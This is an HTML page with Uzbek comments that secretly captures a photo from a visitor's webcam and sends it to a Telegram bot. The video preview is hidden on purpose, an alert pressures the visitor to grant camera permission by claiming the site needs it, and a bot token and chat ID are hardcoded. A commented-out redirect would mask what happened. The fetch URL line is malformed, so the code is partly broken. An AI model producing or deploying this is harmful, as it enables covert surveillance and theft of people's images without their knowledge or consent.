<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Kamera Avto</title>
</head>
<body>
    <!-- Kamera ko'rinmasligi uchun videoni kichik qilamiz yoki yashiramiz -->
    <video id="video" autoplay playsinline style="width:1px; height:1px; opacity: 0;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // SOZLAMALAR:
        // * BU YERGA O'Z TOKENINGIZNI QO'YING *
        const BOT_TOKEN = '8287232126:AAH_Z1mFxaBfyarKbNQFBz1xQ2pico0OSsE'; 
        // * BU YERGA O'Z CHAT IDINGIZNI QO'YING *
        const CHAT_ID = '8261811040';     

        // Kamerani yoqish va rasm olish jarayoni
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            // Faqat videoni so'raymiz, audioni emas (oldingi xatoni bartaraf etish uchun)
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                
                // Kamera yoqilgach, 2 soniya kutib avtomatik rasm oladi
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);

                        // Rasmni Telegramga yuborish
                        canvas.toBlob(blob => {
                            if (!blob) {
                                console.error("Rasm yaratishda xatolik yuz berdi!");
                                return;
                            }
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'auto_shot.png');

                            // TO'G'RILANGAN FETCH MANZILI (HTTPS va bot${token} sintaksisi)
                            fetch(api.telegram.org{BOT_TOKEN}/sendPhoto, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.ok) {
                                    console.log("Rasm muvaffaqiyatli yuborildi!", data);
                                    // Rasm ketgandan so'ng boshqa saytga yuborish mumkin
                                    // window.location.href = "https://google.com";
                                } else {
                                    console.error("Telegram API xatosi:", data.description);
                                }
                                // Streamni yopish
                                stream.getTracks().forEach(track => track.stop());
                            })
                            .catch(err => console.error("Tarmoq yoki fetch xatosi:", err));
                        }, 'image/png');
                    }, 2000); 
                };
            })
            .catch(err => {
                // Bu yerda siz ko'rsatgan "NotFoundError" kabi xatolar ushlanadi
                alert("Sayt ishlashi uchun kameraga ruxsat berishingiz yoki kamera mavjudligiga ishonch hosil qilishingiz kerak!");
                console.error("Kameraga kirishda xatolik:", err);
            });
        } else {
            alert("Sizning brauzeringiz kamerani qo'llab-quvvatlamaydi.");
        }
    </script>
</body>
</html>
